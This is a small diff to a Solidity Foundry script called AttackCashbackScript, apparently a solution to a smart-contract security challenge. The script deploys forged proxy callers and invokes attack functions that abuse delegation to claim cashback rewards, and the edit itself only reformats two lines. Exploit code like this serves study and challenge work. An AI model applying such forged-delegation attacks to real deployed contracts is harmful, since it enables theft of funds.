@@ -26,14 +26,12 @@ contract AttackCashbackScript is Script {
 
         ForgedProxyFactory factory = new ForgedProxyFactory();
 
-        FreeDelegationLogic freeLogic =
-            new FreeDelegationLogic(cashback, free, player, superCashbackNFT);
+        FreeDelegationLogic freeLogic = new FreeDelegationLogic(cashback, free, player, superCashbackNFT);
 
         address forgedFreeCaller = factory.deploy(cashback, address(freeLogic));
         FreeDelegationLogic(forgedFreeCaller).attackFreeCashback();
 
-        NativeDelegationLogic nativeLogic =
-            new NativeDelegationLogic(cashback, player, superCashbackNFT);
+        NativeDelegationLogic nativeLogic = new NativeDelegationLogic(cashback, player, superCashbackNFT);
 
         address forgedNativeCaller = factory.deploy(cashback, address(nativeLogic));
         NativeDelegationLogic(forgedNativeCaller).attackNativeCashback();
